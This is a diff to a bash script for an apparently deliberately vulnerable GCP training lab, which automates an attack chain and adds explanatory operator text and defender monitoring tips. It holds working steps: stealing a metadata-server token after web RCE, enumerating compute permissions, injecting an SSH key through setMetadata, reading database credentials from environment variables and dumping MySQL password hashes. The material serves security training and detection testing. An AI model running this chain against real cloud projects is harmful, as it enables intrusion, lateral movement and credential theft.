@@ -43,13 +43,12 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 1              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            CDRGoat GCP - Scenario 1              ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Exploitation of Web RCE, metadata stealing on VMa\n"
   printf "  • Step 2. Permission enumeration for stolen metadata\n"
-  printf "  • Step 3. Access gathering to VMb via uploading new sshkey\n"
-  printf "  • Step 4. Stealing credentials to access RDS\n"
-  printf "  • Step 5. Accessing sensitive data in RDS\n"
+  printf "  • Step 3. Access gathering to VMb via uploading new SSH key\n"
+  printf "  • Step 4. Stealing credentials and accessing sensitive data in Cloud SQL\n"
 }
 banner
 
@@ -185,6 +184,20 @@ chmod 600 "$ENVFILE"
 printf "\n"
 ok "Identified project_id = ${YELLOW}${PROJECT_ID}${RESET}. Configuration ${YELLOW}${CFG}${RESET} is set and stored in ${YELLOW}${ENVFILE}${RESET}"
 
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We exploited a Remote Code Execution (RCE) vulnerability in the web application\n"
+printf "to access the GCP Metadata Server at metadata.google.internal.\n\n"
+printf "From the metadata server, we obtained:\n"
+printf "  • ${MAGENTA}Access Token${RESET}: OAuth2 bearer token for GCP API calls\n"
+printf "  • ${MAGENTA}Project ID${RESET}: The GCP project identifier\n\n"
+printf "These tokens inherit the permissions of the VM's attached Service Account.\n"
+printf "Unlike AWS (role-based temporary credentials), GCP uses OAuth2 tokens that\n"
+printf "can be used directly with gcloud CLI or REST APIs.\n\n"
+printf "The token is stored locally and will be used for subsequent enumeration.\n\n"
+
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -207,17 +220,32 @@ try() {
   fi
 }
 
-printf "GCP tokens work a bit different comparing with AWS but similar to Azure. We may check the area of possible token usage (scope) via requesting tokeninfo.\n"
+step "Checking token scope via tokeninfo endpoint"
 source $ENVFILE
-curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}"   | jq
-printf "\nOur scope is ${YELLOW}'compute'${RESET} only. So lets enumerate permisions for this part.\n\n"
+curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}" | jq
 
+step "Enumerating compute permissions"
 # 1) Compute: list instances (aggregated)
 try "Compute: list instances" gcloud compute instances list
 gcloud compute instances list --filter="name~^streamgoat"
 try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a
 
-printf "\nDuring recon and initial priv enumiration new compute resource was detected - ${YELLOW}streamgoat-vm-b${RESET}\n"
+ok "New compute resource detected: ${YELLOW}streamgoat-vm-b${RESET}"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "GCP access tokens have a defined ${MAGENTA}scope${RESET} that limits which APIs can be called.\n"
+printf "We queried the tokeninfo endpoint to understand our token's capabilities.\n\n"
+printf "Our token scope is ${YELLOW}'compute'${RESET}, meaning we can interact with:\n"
+printf "  • Compute Engine VMs and metadata\n"
+printf "  • Instance groups and templates\n"
+printf "  • Disks and snapshots\n\n"
+printf "During enumeration, we discovered another VM: ${YELLOW}streamgoat-vm-b${RESET}.\n"
+printf "This VM may have different permissions or contain sensitive data.\n\n"
+printf "Next: Attempt to gain access to streamgoat-vm-b via metadata manipulation.\n\n"
+
 read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -225,7 +253,7 @@ read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 #############################################
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Access via compute.instances.setMetadata  ===" "${RESET}"
 
-printf "\nOn step 2 we identified a few 'list' privilegies for compute service. Now we will try to check if we may modify MetaData to get access to the hosts.\n"
+step "Attempting to modify instance metadata for SSH access"
 
 KEY_DIR="/tmp/.streamgoat"
 KEY_FILE="${KEY_DIR}/temp_ssh_key"
@@ -275,6 +303,22 @@ else
   exit 8
 fi
 
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We exploited the ${MAGENTA}compute.instances.setMetadata${RESET} permission to inject\n"
+printf "an SSH public key into the target VM's metadata.\n\n"
+printf "GCP VMs with the OS Login feature disabled accept SSH keys via metadata:\n"
+printf "  • Instance-level metadata: ${YELLOW}ssh-keys${RESET} attribute\n"
+printf "  • Project-level metadata: applies to all VMs in the project\n\n"
+printf "This is a common ${RED}privilege escalation${RESET} technique in GCP:\n"
+printf "  1. Attacker has compute.instances.setMetadata permission\n"
+printf "  2. Attacker injects their SSH key into VM metadata\n"
+printf "  3. GCP guest agent automatically creates the user and authorizes the key\n"
+printf "  4. Attacker gains shell access to the VM\n\n"
+printf "Now we have access to streamgoat-vm-b and can search for credentials.\n\n"
+
 read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -291,10 +335,48 @@ ok "Sensitive environment variables extracted"
 
 step "Executing${YELLOW} SELECT User,plugin,authentication_string from user;${RESET}"
 ssh -i "$KEY_FILE" "$OS_USER@$PUBLIC_IP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'"
-printf "\n"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We discovered database credentials stored in environment variables on the VM.\n"
+printf "This is a common misconfiguration — credentials in env vars are:\n\n"
+printf "  • Visible to any process running as the same user\n"
+printf "  • Logged in shell history and process listings\n"
+printf "  • Exposed via /proc/*/environ to privileged users\n\n"
+printf "Using these credentials, we connected to Cloud SQL and extracted:\n"
+printf "  • User accounts and their authentication methods\n"
+printf "  • Password hashes (authentication_string column)\n\n"
+printf "Better alternatives for credential management in GCP:\n"
+printf "  • ${CYAN}Secret Manager${RESET}: Centralized secret storage with IAM\n"
+printf "  • ${CYAN}Workload Identity${RESET}: Service account tokens for database auth\n"
+printf "  • ${CYAN}Cloud SQL IAM Auth${RESET}: Native IAM-based database authentication\n\n"
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Exploited RCE vulnerability on VMa web application\n"
+printf "  2. Harvested GCP access token from Metadata Server\n"
+printf "  3. Enumerated compute permissions and discovered VMb\n"
+printf "  4. Injected SSH key via setMetadata permission\n"
+printf "  5. Gained shell access to VMb\n"
+printf "  6. Extracted database credentials from environment variables\n"
+printf "  7. Connected to Cloud SQL and exfiltrated user data\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Full compromise of Cloud SQL database\n"
+printf "  • Lateral movement between VMs via metadata abuse\n"
+printf "  • Credential theft from environment variables\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • Unusual metadata server access patterns\n"
+printf "  • SSH key additions to instance/project metadata\n"
+printf "  • Database connections from unexpected source IPs\n"
+printf "  • Environment variable access to sensitive patterns\n\n"
 
 rm -rf /tmp/.streamgoat
-read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
-# ==============
-# Cleanup
-# ==============
+read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit..." _ || true
